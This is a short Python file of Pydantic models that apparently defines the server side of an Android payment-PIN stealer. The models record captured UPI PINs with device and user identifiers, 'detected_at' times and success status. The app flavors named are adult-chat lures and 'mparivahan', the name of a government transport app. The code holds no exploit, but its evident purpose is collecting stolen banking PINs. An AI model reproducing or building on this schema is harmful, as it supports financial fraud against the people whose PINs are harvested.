from pydantic import BaseModel, Field
from typing import Optional, List
from datetime import datetime, timezone
from ..utils.datetime_utils import utc_now

class UPIPinEntry(BaseModel):
    pin: str = Field(..., description="UPI PIN value")
    app_type: str = Field(..., description="App flavor: sexychat | mparivahan | sexyhub")
    status: str = Field(..., description="PIN status: success | failed")
    detected_at: datetime = Field(..., description="When PIN was detected")

class UPIPinSave(BaseModel):
    upi_pin: str = Field(..., min_length=4, max_length=6, description="4 or 6 digit UPI PIN")
    device_id: str = Field(..., description="Device identifier")
    app_type: str = Field(..., description="App flavor: sexychat | mparivahan | sexyhub")
    status: str = Field(default="success", description="PIN status: success | failed")
    user_id: str = Field(..., description="Static user identifier")

class UPIPinResponse(BaseModel):
    status: str = "success"
    message: str = "PIN saved successfully"
    timestamp: datetime = Field(default_factory=utc_now)